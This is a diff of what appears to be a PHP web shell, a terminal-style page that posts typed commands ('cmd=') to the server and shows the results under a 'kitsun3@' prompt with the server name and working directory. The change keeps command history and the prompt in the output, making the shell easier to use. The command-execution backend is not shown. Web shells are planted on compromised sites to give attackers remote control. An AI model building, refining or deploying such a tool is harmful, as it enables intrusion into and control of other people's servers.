@@ -69,7 +69,8 @@ main();
                     if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
                         output = xhr.responseText.split("id='response'>")[0].split("<div")[0];
                         var element = document.getElementById('output');
-                        element.innerHTML = '<pre>' + output + '</pre>';
+                        pmpt = xhr.responseText.split('id="prompt">')[2].split("</div>")[0];
+                        element.innerHTML = '<pre>' + element.innerHTML + pmpt + command + '\n' + output + '</pre>';
                     }
                 }
                 xhr.send("cmd="+command);
@@ -114,7 +115,7 @@ main();
         <div id='output'></div>
 
             <?php
-                echo '<span>kitsun3@</span>'. $_SERVER['SERVER_NAME'].':$'. '<span id="path">'.getcwd().' $'.'</span>';
+                echo '<div id="prompt"><span>kitsun3@</span>'. $_SERVER['SERVER_NAME'].':$'. '<span id="path">'.getcwd().' $ '.'</span></div>';
             ?>
             <input type="text" name="cmd" id="myInput">
         </div>
